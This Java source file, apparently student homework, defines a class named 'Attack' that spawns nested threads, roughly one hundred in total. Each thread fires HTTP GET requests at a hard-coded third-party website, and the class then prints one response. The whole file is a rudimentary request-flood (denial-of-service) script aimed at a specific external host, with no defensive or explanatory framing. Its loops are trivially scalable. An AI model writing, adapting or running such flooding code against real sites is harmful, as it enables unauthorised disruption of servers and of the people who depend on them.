package javaEx.plus.Io.homework.Reptile;

import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;

import java.time.LocalDateTime;
import java.util.concurrent.*;

/**
 * @author SiYi
 * @version 1.0
 * @date 2023/9/19 17:17
 * @desciption:
 */
public class Attack {
    public static void main(String[] args) {
        String URL = " https://yinan.yuanbo1.top/";
        ThreadPoolExecutor executor = new ThreadPoolExecutor(50, 50, 0L, TimeUnit.NANOSECONDS, new SynchronousQueue());
//        for (int i = 0; i < 50; i++) {
//            executor.execute(new Runnable() {
//                @Override
//                public void run() {
//
//                }
//            });
//        }
        ExecutorService executors = Executors.newCachedThreadPool();
        for (int i = 0; i < 10; i++) {
            Runnable r = () -> {

                for (int j = 0; j < 10; j++) {
                    int ii=j;
                    Runnable s = () -> {
                        HttpResponse response = HttpRequest.get(URL).execute();
                        // String result = response.toString();
                        //System.out.println("访问一次"+ LocalDateTime.now());
                    };
                    new Thread(s).start();


                }
               // String result = response.toString();
                //System.out.println("访问一次"+ LocalDateTime.now());
            };
            new Thread(r).start();


        }
       HttpResponse response = HttpRequest.get(URL).execute();
        String result = response.toString();
        System.out.println(result);




    }
}
